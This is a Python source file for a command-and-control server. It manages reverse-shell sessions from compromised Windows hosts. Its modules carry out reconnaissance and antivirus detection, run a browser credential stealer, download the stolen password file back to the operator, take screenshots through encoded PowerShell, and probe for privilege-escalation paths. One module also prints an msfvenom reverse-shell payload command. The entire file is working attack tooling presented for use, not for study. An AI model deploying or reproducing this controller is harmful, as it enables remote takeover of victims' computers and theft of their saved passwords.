#!/usr/bin/env python3
"""
C2 Listener with Browser Stealer + File Download
"""
import socket, sys, threading, time, base64, re, os
from datetime import datetime

class C2Listener:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host, self.port = host, port
        self.sessions, self.session_counter = {}, 0
        
    def log(self, msg):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
    
    def send_command(self, client, cmd):
        try:
            client.send((cmd + '\n').encode())
            time.sleep(0.4)
            return True
        except: return False
    
    def recv_output(self, client, timeout=10):
        client.settimeout(timeout)
        output = b""
        try:
            while True:
                chunk = client.recv(8192)
                if not chunk: break
                output += chunk
                if b"shell> " in output: break
        except: pass
        client.settimeout(None)
        return output.decode('utf-8', errors='ignore')
    
    def clean_output(self, text):
        """Remove shell prompts and clean output"""
        lines = text.split('\n')
        cleaned = []
        for line in lines:
            line = line.replace('shell> ', '').strip()
            if line and line != '\r':
                cleaned.append(line)
        return '\n'.join(cleaned)
    
    def handle_client(self, client_socket, addr, session_id):
        self.log(f"Session {session_id} opened from {addr[0]}:{addr[1]}")
        try:
            while True:
                time.sleep(1)
                if session_id not in self.sessions: break
        except: pass
        finally:
            try: client_socket.close()
            except: pass
            if session_id in self.sessions:
                del self.sessions[session_id]
            self.log(f"Session {session_id} closed")
    
    def execute_module(self, session_id, module):
        if session_id not in self.sessions:
            print(f"[!] Session {session_id} not found")
            return
        
        client = self.sessions[session_id]['socket']
        modules = {
            "sysinfo": self.module_sysinfo,
            "persist": self.module_persist,
            "privesc": self.module_privesc,
            "network": self.module_network,
            "screenshot": self.module_screenshot,
            "autopwn": self.module_autopwn,
            "dump": self.module_dump_all,
            "stealer": self.module_browser_stealer,
            "download": self.module_download_file,
        }
        
        if module in modules:
            modules[module](client)
        else:
            print(f"[!] Unknown module: {module}")
    
    def module_download_file(self, client, remote_path=None):
        """Download a file from target to Kali"""
        print("\n" + "="*70)
        print("FILE DOWNLOAD")
        print("="*70)
        
        if not remote_path:
            remote_path = "%TEMP%\\browser_passwords.txt"
        
        print(f"[*] Downloading: {remote_path}")
        
        # Check if file exists
        self.send_command(client, f'if exist "{remote_path}" echo EXISTS')
        check = self.recv_output(client, 3)
        if 'EXISTS' not in check:
            print(f"[!] File not found: {remote_path}")
            print("="*70)
            return
        
        # Get file size
        self.send_command(client, f'powershell -Command "(Get-Item \'{remote_path}\').Length"')
        size_output = self.clean_output(self.recv_output(client, 3))
        try:
            file_size = int(size_output.split('\n')[0])
            print(f"[*] File size: {file_size} bytes")
        except:
            print("[!] Cannot determine file size")
            file_size = 0
        
        # Read file as Base64
        print("[*] Encoding file...")
        b64_cmd = f'powershell -Command "$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes(\'{remote_path}\'));Write-Output $b64"'
        self.send_command(client, b64_cmd)
        output = self.recv_output(client, 30)
        
        # Extract Base64 data
        lines = output.split('\n')
        b64_data = ''
        for line in lines:
            line = line.strip()
            if line and 'shell>' not in line and len(line) > 20:
                b64_data += line
        
        if len(b64_data) < 10:
            print("[!] Failed to read file")
            print("="*70)
            return
        
        # Decode and save
        try:
            file_data = base64.b64decode(b64_data)
            
            # Generate local filename
            original_name = remote_path.split('\\')[-1]
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            local_path = f"downloaded_{timestamp}_{original_name}"
            
            with open(local_path, 'wb') as f:
                f.write(file_data)
            
            print(f"[+] Downloaded successfully!")
            print(f"[+] Saved to: {local_path}")
            print(f"[+] Size: {len(file_data)} bytes")
            
            # If it's a text file, show preview
            if original_name.endswith('.txt'):
                print("\n[*] File preview (first 20 lines):")
                print("-" * 70)
                preview = file_data.decode('utf-8', errors='ignore').split('\n')[:20]
                for line in preview:
                    print(line)
                if len(file_data.decode('utf-8', errors='ignore').split('\n')) > 20:
                    print("... (truncated)")
                print("-" * 70)
            
        except Exception as e:
            print(f"[!] Error: {e}")
        
        print("="*70)
    
    def module_browser_stealer(self, client):
        """Browser credential stealer - runs built-in C stealer"""
        print("\n" + "="*70)
        print("BROWSER CREDENTIAL STEALER")
        print("="*70)
        print("[*] Running integrated stealer...")
        
        # Just run the built-in stealer command
        self.send_command(client, 'stealer')
        output = self.recv_output(client, timeout=60)
        
        # Display output
        cleaned = self.clean_output(output)
        if cleaned:
            print(cleaned)
        
        # Auto-download the generated file
        if "Saved to:" in output:
            print("\n[*] Auto-downloading generated file...")
            time.sleep(1)
            self.module_download_file(client, "%TEMP%\\browser_passwords.txt")
        
        print("="*70)
    
    def module_sysinfo(self, client):
        print("\n" + "="*70)
        print("SYSTEM RECONNAISSANCE")
        print("="*70)
        
        print("\n[+] Basic Information:")
        info = {}
        for cmd, label in [("hostname", "Hostname"), ("whoami", "User"), 
                           ("echo %COMPUTERNAME%", "Computer"), ("echo %USERDOMAIN%", "Domain")]:
            self.send_command(client, cmd)
            output = self.clean_output(self.recv_output(client))
            if output: info[label] = output.split('\n')[0]
        
        for key, val in info.items():
            print(f"  {key:15s}: {val}")
        
        print("\n[+] Privilege Level:")
        self.send_command(client, 'net session 2>&1 | findstr /C:"Access is denied" /C:"accs refus"')
        output = self.recv_output(client)
        status = "USER" if any(x in output.lower() for x in ['denied', 'refus']) else "ADMINISTRATOR"
        print(f"  Status: {status}")
        
        print("\n[+] Operating System:")
        self.send_command(client, 'systeminfo | findstr /B /C:"OS" /C:"System"')
        output = self.clean_output(self.recv_output(client))
        for line in output.split('\n')[:5]:
            if line.strip(): print(f"  {line}")
        
        print("\n[+] Antivirus:")
        self.send_command(client, r'powershell -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName" 2>$null')
        output = self.clean_output(self.recv_output(client, 8))
        avs = [l.strip() for l in output.split('\n') if l.strip() and 'Get-CimInstance' not in l]
        if avs:
            for av in avs[:3]: print(f"  - {av}")
        else:
            print("  - Unable to detect")
        
        print("="*70)
    
    def module_persist(self, client):
        print("\n" + "="*70)
        print("PERSISTENCE MECHANISMS")
        print("="*70)
        print("\n[+] Registry Run Keys (HKCU):")
        self.send_command(client, r'reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run')
        output = self.clean_output(self.recv_output(client))
        for entry in [l for l in output.split('\n') if 'REG_SZ' in l][:15]:
            print(f"  {entry}")
        print("\n[+] Startup Folder:")
        self.send_command(client, r'dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" /B')
        output = self.clean_output(self.recv_output(client))
        files = [l for l in output.split('\n') if l.strip()]
        if files:
            for f in files: print(f"  {f}")
        else:
            print("  (Empty)")
        print("="*70)
    
    def module_privesc(self, client):
        print("\n" + "="*70)
        print("PRIVILEGE ESCALATION")
        print("="*70)
        print("\n[+] Privileges:")
        self.send_command(client, 'whoami /priv | findstr /I "Enabled"')
        for priv in self.clean_output(self.recv_output(client)).split('\n')[:15]:
            print(f"  {'[EXPLOIT] ' if any(x in priv for x in ['SeImpersonate', 'SeDebug']) else ''}{priv}")
        print("\n[+] AlwaysInstallElevated:")
        self.send_command(client, r'reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul && reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul')
        output = self.recv_output(client)
        if '0x1' in output and output.count('0x1') >= 2:
            print("  [VULNERABLE]")
        else:
            print("  Not vulnerable")
        print("="*70)
    
    def module_autopwn(self, client):
        print("\n" + "="*70)
        print("AUTO PRIVILEGE ESCALATION")
        print("="*70)
        print("\n[1] AlwaysInstallElevated:")
        self.send_command(client, r'reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul && reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul')
        if self.recv_output(client).count('0x1') >= 2:
            print("  [+] VULNERABLE! msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o evil.msi")
        else:
            print("  [-] Not vulnerable")
        print("\n[2] SeImpersonate:")
        self.send_command(client, 'whoami /priv | findstr SeImpersonate')
        if 'SeImpersonate' in self.recv_output(client) and 'Enabled' in self.recv_output(client):
            print("  [+] ENABLED! Use PrintSpoofer/JuicyPotato")
        else:
            print("  [-] Not available")
        print("="*70)
    
    def module_network(self, client):
        print("\n[*] Network Enumeration...")
        print("\n[+] Active Connections:")
        self.send_command(client, 'netstat -ano | findstr ESTABLISHED | findstr /V "127.0.0.1"')
        for line in self.clean_output(self.recv_output(client)).split('\n')[:20]:
            if line.strip(): print(f"  {line}")
    
    def module_screenshot(self, client):
        print("\n[*] Taking screenshot...")
        ps = r'Add-Type -A System.Windows.Forms,System.Drawing;$b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);$g=[System.Drawing.Graphics]::FromImage($b);$g.CopyFromScreen(0,0,0,0,$b.Size);$b.Save("$env:TEMP\sc.png");Write-Host "Screenshot: $env:TEMP\sc.png"'
        ps_b64 = base64.b64encode(ps.encode('utf-16-le')).decode()
        self.send_command(client, f'powershell -EncodedCommand {ps_b64}')
        print(self.clean_output(self.recv_output(client, 12)))
    
    def module_dump_all(self, client):
        print("\n[*] Full Reconnaissance Dump\n")
        self.module_sysinfo(client)
        time.sleep(1)
        self.module_browser_stealer(client)
        time.sleep(1)
        self.module_persist(client)
        time.sleep(1)
        self.module_privesc(client)
        print("\n[+] Complete!")
    
    def interact(self, session_id):
        if session_id not in self.sessions:
            print(f"[!] Session {session_id} not found")
            return
        
        client = self.sessions[session_id]['socket']
        print(f"\n[*] Session {session_id}")
        print("[*] Modules: sysinfo, stealer, download, privesc, autopwn, persist, network, screenshot, dump\n")
        
        try:
            while True:
                cmd = input()
                if cmd.lower() == 'background': break
                elif cmd.lower() == 'help':
                    print("\nCommands: background, modules, run <module>, download <path>, <any shell command>")
                    continue
                elif cmd.lower() == 'modules':
                    print("\nModules: sysinfo, stealer, download, privesc, autopwn, persist, network, screenshot, dump")
                    continue
                elif cmd.lower().startswith('run '):
                    self.execute_module(session_id, cmd.split(' ', 1)[1])
                    continue
                elif cmd.lower().startswith('download '):
                    path = cmd.split(' ', 1)[1] if len(cmd.split(' ', 1)) > 1 else None
                    self.module_download_file(client, path)
                    continue
                if not cmd: continue
                if not self.send_command(client, cmd): break
                print(self.recv_output(client), end='')
        except KeyboardInterrupt:
            print("\n[*] Use 'background'")
        except Exception as e:
            print(f"[!] Error: {e}")
    
    def list_sessions(self):
        if not self.sessions:
            print("[*] No sessions")
            return
        print("\nActive Sessions:")
        print("=" * 70)
        for sid, info in self.sessions.items():
            print(f"  [{sid}] {info['addr'][0]}:{info['addr'][1]} - {info['time']}")
        print("=" * 70)
    
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        self.log(f"C2 Listener on {self.host}:{self.port}")
        
        def accept_connections():
            while True:
                try:
                    client, addr = server.accept()
                    self.session_counter += 1
                    sid = self.session_counter
                    self.sessions[sid] = {'socket': client, 'addr': addr, 'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
                    t = threading.Thread(target=self.handle_client, args=(client, addr, sid))
                    t.daemon = True
                    t.start()
                except: pass
        
        t = threading.Thread(target=accept_connections)
        t.daemon = True
        t.start()
        self.command_loop()
    
    def command_loop(self):
        print("\n=== C2 Console ===")
        print("Commands: sessions, interact <id>, exit\n")
        while True:
            try:
                cmd = input("c2> ").strip()
                if not cmd: continue
                if cmd == "sessions":
                    self.list_sessions()
                elif cmd.startswith("interact"):
                    parts = cmd.split()
                    if len(parts) == 2:
                        try:
                            self.interact(int(parts[1]))
                        except ValueError:
                            print("[!] Invalid ID")
                    else:
                        print("[!] Usage: interact <id>")
                elif cmd == "exit":
                    sys.exit(0)
                else:
                    print(f"[!] Unknown: {cmd}")
            except KeyboardInterrupt:
                print("\n[*] Use 'exit'")
            except Exception as e:
                print(f"[!] Error: {e}")

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description='C2 Listener')
    p.add_argument('-H', '--host', default='0.0.0.0')
    p.add_argument('-p', '--port', type=int, default=4444)
    args = p.parse_args()
    C2Listener(args.host, args.port).start()
